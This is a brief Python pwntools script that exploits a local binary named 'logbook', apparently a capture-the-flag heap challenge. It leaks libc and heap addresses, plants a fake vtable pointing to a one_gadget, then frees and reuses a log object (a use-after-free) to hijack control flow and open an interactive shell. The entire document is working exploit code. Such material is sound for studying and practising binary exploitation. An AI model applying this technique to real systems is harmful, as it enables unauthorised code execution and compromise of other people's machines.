#!/usr/bin/python3
from pwn import *

def exploit(p):
    ''''''
    libc = ELF('./libc.so.6')

    p.recvuntil('address: ')
    puts = int(p.recvline().strip(), 16)
    libc.address = puts - libc.symbols['puts']

    p.sendafter('> ', b'1\n') # Create Log
    p.recvuntil('leak: ')
    heap_leak = int(p.recvline().strip(), 16)
    pointer = heap_leak + 0x20 # fake vtable pointer

    p.sendafter('> ', b'3\n') # Store Data to create fake vtable
    p.sendafter('data: ', p64(libc.address + 0x4f302) + b'\n') 
    p.sendafter('> ', b'4\n') # Delete Log
    p.sendafter('> ', b'3\n') # Store Data
    p.sendafter('data: ', p64(pointer) + b'\n') 
    p.sendafter('> ', b'2\n') # Log Message
    p.sendafter('data: ', b'aaaaaaaa\n') 

#p = gdb.debug('./logbook', '''
#set follow-fork-mode parent
#c
#''')

p = process('./logbook')

exploit(p)

p.interactive()
